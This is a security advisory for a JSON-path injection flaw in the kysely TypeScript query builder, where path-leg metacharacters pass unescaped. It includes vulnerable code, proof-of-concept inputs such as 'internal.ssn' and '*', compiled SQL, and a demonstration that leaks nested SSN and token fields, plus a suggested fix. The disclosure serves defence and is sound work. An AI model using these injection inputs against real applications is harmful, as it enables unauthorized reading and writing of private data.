# [H] Kysely: JSON-path traversal injection via unsanitized path-leg metacharacters in `JSONPathBuilder.key()` / `.at()`

## Summary
Severity: High
Advisory: GHSA-pv5w-4p9q-p3v2
CVE: CVE-2026-44635
CWE: CWE-1284, CWE-22, CWE-89, CWE-915
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-pv5w-4p9q-p3v2
Type: github-advisory

## Affected
- npm: `kysely` — affected >=0.26.0 <0.28.17

## Details
## Summary

Kysely 0.28.12 added a `sanitizeStringLiteral()` call inside `DefaultQueryCompiler.visitJSONPathLeg` (commit `0a602bf`, PR #1727) to fix CVE-2026-32763 (`GHSA-wmrf-hv6w-mr66`). The fix only doubles single quotes (`'` → `''`); it does **not** escape JSON-path metacharacters (`.`, `[`, `]`, `*`, `**`, `?`). When attacker-controlled input flows into `eb.ref(col, '->$').key(input)` or `.at(input)` — including type-safe code where the JSON column is shaped like `Record<string, T>` so `K extends string` is the inferred type — every dot becomes a path-leg separator, letting an attacker traverse from the intended key into sibling and child fields the developer never meant to expose. The result is read access (and, in update statements, write access) to JSON sub-fields outside the intended scope across MySQL, PostgreSQL `->$`/`->>$`, and SQLite.

* Project: Kysely — TypeScript SQL query builder (npm `kysely`); affects MySQL, PostgreSQL `->$`/`->>$`, and SQLite dialects.
* Source reviewed: `kysely-org/kysely` @ `master` (`73192e4`, version `0.28.16`).
* Deployed artefact validated: `kysely@0.28.16` from npm.
* Affected file(s):
  * `src/query-compiler/default-query-compiler.ts` (lines 1611–1639, 1821–1823)
  * `src/query-builder/json-path-builder.ts` (lines 93–196)
  * `src/dialect/mysql/mysql-query-compiler.ts` (overrides `sanitizeStringLiteral` but inherits the same behaviour for path legs — escapes `\` and `'`, nothing else)
* CWE: CWE-89 — Improper Neutralization of Special Elements used in an SQL Command, with CWE-915 / CWE-1284 (improper validation of specified quantity in input) flavours for the JSON-path sub-language.
* OWASP 2021: A03:2021 — Injection.

## Vulnerable code

`src/query-compiler/default-query-compiler.ts:1625-1639`:

```ts
protected override visitJSONPathLeg(node: JSONPathLegNode): void {
  const isArrayLocation = node.type === 'ArrayLocation'

  this.append(isArrayLocation ? '[' : '.')      // (1)

  this.append(
    typeof node.value === 'string'
      ? this.sanitizeStringLiteral(node.value)  // (2)
      : String(node.value),
  )

  if (isArrayLocation) {
    this.append(']')
  }
}
```

`src/query-compiler/default-query-compiler.ts:1821-1823`:

```ts
protected sanitizeStringLiteral(value: string): string {
  return value.replace(LIT_WRAP_REGEX, "''")    // (3)
}
```

with `LIT_WRAP_REGEX = /'/g`.

`src/query-builder/json-path-builder.ts:151-167`:

```ts
key<
  K extends any[] extends O
    ? never
    : O extends object
      ? keyof NonNullable<O> & string
      : never,
  O2 = undefined extends O
    ? null | NonNullable<NonNullable<O>[K]>
    : null extends O
      ? null | NonNullable<NonNullable<O>[K]>
      : // when the object has non-specific keys, e.g. Record<string, T>, should infer `T | null`!
        string extends keyof NonNullable<O>
        ? null | NonNullable<NonNullable<O>[K]>
        : NonNullable<O>[K],
>(key: K): TraversedJSONPathBuilder<S, O2> {
  return this.#createBuilderWithPathLeg('Member', key)  // (4)
}
```

`src/query-builder/json-path-builder.ts:169-196`:

```ts
#createBuilderWithPathLeg(
  legType: JSONPathLegType,
  value: string | number,                                // (5)
): TraversedJSONPathBuilder<any, any> {
  // ...
  return new TraversedJSONPathBuilder(
    JSONPathNode.cloneWithLeg(
      this.#node,
      JSONPathLegNode.create(legType, value),            // (6)
    ),
  )
}
```

At (1) the compiler emits the path-leg separator — `.` for member access or `[` for array index. At (2) the user-supplied string is run through `sanitizeStringLiteral`, which at (3) only doubles single quotes (`'`). Dots, brackets, asterisks, double-asterisks and question marks — every reserved character of the SQL/JSON path mini-language — pass through unmodified.

At (4) `.key(K)` types `K` as `keyof NonNullable<O> & string`. When the JSON column is typed as `Record<string, T>` (a common shape for free-form metadata blobs) the inferred `K` is just `string`, so attacker-controlled input is **type-safe** and does not need a `Kysely<any>` escape hatch — this finding is *broader* than `GHSA-wmrf-hv6w-mr66` (CVE-2026-32763), which only covered the `Kysely<any>` case. At (5)/(6) the runtime accepts any `string | number` regardless of `legType`, so a string sent into `.at(...)` (`'last'`/`'#-N'` per the public type signature) also reaches the same emitter and can carry `]` to break out of the bracket.

The fix at `0a602bf` only addressed the single-quote → string-literal escape. The JSON-path metacharacter set was overlooked.

`MysqlQueryCompiler.sanitizeStringLiteral` (`src/dialect/mysql/mysql-query-compiler.ts:47-51`) overrides the helper to also escape backslashes — but again, it does nothing for `. [ ] * ** ?`.

## Reproduction (validated locally)

Environment: `kysely@0.28.16` + `better-sqlite3@12.x`, Node 22, on macOS. The PoC harness lives in `/Users/admin/joplin_research/kysely-poc/`.

### Step 1 — Compiled-SQL evidence across all three dialects

`/Users/admin/joplin_research/kysely-poc/poc.mjs` (no DB, just `.compile()`):

```bash
$ node poc.mjs
===== MySQL =====

--- baseline: .key("nick") ---
SQL:     select `profile`->'$.nick' as `out` from `person`

--- INJECTION via .key(ATTACKER) -- "nick.secret_field" ---
SQL:     select `profile`->'$.nick.secret_field' as `out` from `person`

--- INJECTION via .key("*") -- wildcard reaches all keys ---
SQL:     select `profile`->'$.*' as `out` from `person`

--- INJECTION via .at(ATTACKER3) -- bracket escape ---
SQL:     select `profile`->'$[].secret]' as `out` from `person`

===== PostgreSQL (->$ uses jsonpath, MySQL-like) =====

--- baseline: .key("nick") ---
SQL:     select "profile"->'$.nick' as "out" from "person"

--- INJECTION via .key(ATTACKER) ---
SQL:     select "profile"->'$.nick.secret_field' as "out" from "person"

===== SQLite =====

--- baseline: .key("nick") ---
SQL:     select "profile"->>'$.nick' as "value" from "person"

--- INJECTION via .key(ATTACKER) ---
SQL:     select "profile"->>'$.nick.secret_field' as "out" from "person"

--- INJECTION via .key("*") ---
SQL:     select "profile"->>'$.*' as "out" from "person"
```

The compiled SQL clearly shows the dot inside the user-supplied "key" being interpreted by the database as a path separator: `'$.nick'` (one leg) becomes `'$.nick.secret_field'` (two legs). MySQL additionally accepts `*` as a wildcard reaching every member at the current level.

### Step 2 — End-to-end data disclosure on a real database

`/Users/admin/joplin_research/kysely-poc/sqlite-runtime.mjs` simulates a typical handler that reads one top-level field of the caller's profile:

```js
async function fetchProfileField(userInput) {
  return db.selectFrom('me')
    .select(eb => eb.ref('profile', '->>$').key(userInput).as('value'))
    .where('id', '=', 1)
    .execute()
}
```

The `me.profile` JSON column for user 1 is:

```json
{
  "nick": "alice",
  "tagline": "hi",
  "internal": {
    "ssn": "111-11-1111",
    "token": "tok_abcdef",
    "admin": true
  }
}
```

The developer's intent: only top-level keys (`nick`, `tagline`) are ever requested. `internal` is private bookkeeping.

```bash
$ node sqlite-runtime.mjs
===== Legitimate request =====
userInput = "nick"
  compiled SQL:  select "profile"->>'$.nick' as "value" from "me" where "id" = ?
  result:        [ { value: 'alice' } ]

===== Injection: dot lets attacker reach nested "internal" object =====
userInput = "internal.ssn"
  compiled SQL:  select "profile"->>'$.internal.ssn' as "value" from "me" where "id" = ?
  result:        [ { value: '111-11-1111' } ]

userInput = "internal.token"
  compiled SQL:  select "profile"->>'$.internal.token' as "value" from "me" where "id" = ?
  result:        [ { value: 'tok_abcdef' } ]

userInput = "internal.admin"
  compiled SQL:  select "profile"->>'$.internal.admin' as "value" from "me" where "id" = ?
  result:        [ { value: 1 } ]
```

Expected vs. actual: the application invariant was "the user can only read top-level keys of their profile". The output violates that invariant — `internal.ssn`, `internal.token`, and `internal.admin` are returned even though `internal` was never meant to be addressable through this endpoint.

The same pattern is exploitable on MySQL (where `*` and `**` wildcards make it strictly worse — a single `*` enumerates every sibling at the current level in one row) and on PostgreSQL when using the `->$`/`->>$` operators (which target MySQL-style JSON-path strings on PG ≥ 17 / via `jsonb_path_query`).

## Impact

* **Authorization bypass on JSON sub-fields.** Any kysely-built query whose JSON-path key/index argument is partially or fully attacker-controlled — even in fully type-safe code where the column type is `Record<string, T>` — leaks data the developer believed was scoped behind the explicitly-listed key. SSNs, tokens, admin flags, internal IDs, anything stored as a nested member of the same JSON document is reachable.
* **Wildcard reads on MySQL / PostgreSQL `->$`.** `key('*')` compiles to `'$.*'`, returning the array of every value at the current depth in one round-trip. `key('**')` recurses across the whole document. The fix does not strip either token.
* **Write access in update statements.** Kysely uses the same path compiler for `update().set(eb => eb.ref(col, '->$').key(input), value)`-style writes (and `jsonb_set` helpers). An attacker who can drive both the path and the value can therefore write into nested fields they should not be able to set — for example flipping an `admin` flag or rewriting a nested role.
* **Bypasses the recently-fixed precedent.** The maintainers shipped commit `0a602bf` (PR #1727) specifically to harden this surface. That fix removed the `'` (quote) primitive but left every JSON-path metacharacter alone, so the surface is still open against any caller that *thought* it was now safe.
* **Practical bounding.** The attacker needs a code path where a request-derived string lands in `.key(...)` or `.at(...)`. This is a recognised pattern (filter-by-field, dynamic `select` for admin dashboards, Strapi-style JSON-blob columns); it is not a default kysely behaviour but is plausibly common. The vulnerable path is also exercised any time a developer writes `db as Kysely<any>` (covered by the older `GHSA-wmrf-hv6w-mr66` advisory) — but unlike that advisory, the bug here triggers in fully-typed code on `Record<string, T>` columns.

## Suggested fix

Treat path legs as a structured emission, not a string-literal escape. The narrowest safe patch is a dedicated `sanitizeJSONPathLeg` that only emits a known-good character set per leg type and rejects everything else, since JSON-path quoting differs by dialect (MySQL allows `"…"`-quoted member names; SQLite is more permissive but still has a grammar; PostgreSQL `jsonpath` is strict).

```ts
// src/query-compiler/default-query-compiler.ts
const JSON_PATH_MEMBER_OK = /^[A-Za-z_$][A-Za-z0-9_$]*$/

protected override visitJSONPathLeg(node: JSONPathLegNode): void {
  if (node.type === 'ArrayLocation') {
    this.append('[')
    if (typeof node.value === 'number') {
      this.append(String(node.value | 0))      // int-coerce
    } else if (node.value === 'last' || /^#-\d+$/.test(node.value)) {
      this.append(node.value)                  // documented dialect tokens
    } else {
      throw new Error(`invalid JSON array index: ${node.value}`)
    }
    this.append(']')
    return
  }
  // Member
  this.append('.')
  if (typeof node.value !== 'string' || !JSON_PATH_MEMBER_OK.test(node.value)) {
    // Per-dialect quoted-member escape would go here; default = reject.
    throw new Error(`invalid JSON path member: ${JSON.stringify(node.value)}`)
  }
  this.append(node.value)
}
```

For dialect-specific behaviour (MySQL `"…"`-quoted members, SQLite bracket-quoted), each dialect compiler should override the helper and apply the appropriate quoting + double-the-quote rule, the same way `sanitizeIdentifier` already does.

Consider also: parameterise JSON paths whenever the dialect supports it (PostgreSQL `jsonb_path_query($1, $2)`, MySQL `JSON_EXTRACT(?, ?)`), so attacker-controlled keys are bound, not concatenated. Add a regression test to `test/node/src/json-traversal.test.ts` asserting that `eb.ref('c','->$').key('a.b').compile().sql` is **either** rejected, **or** emits MySQL `'$."a.b"'` / SQLite `'$.["a.b"]'` (quoted-member form), and explicitly differs from `key('a').key('b')`.

A backstop hardening: tighten the `.at()` runtime to accept only `number | 'last' | '#-${digits}'` (matching the type signature), and tighten `.key()` to only accept strings that match `keyof O` at runtime when `O` is statically known.

## References
- https://github.com/kysely-org/kysely/security/advisories/GHSA-pv5w-4p9q-p3v2
- https://nvd.nist.gov/vuln/detail/CVE-2026-44635
- https://github.com/kysely-org/kysely
- https://github.com/kysely-org/kysely/releases/tag/v0.28.17
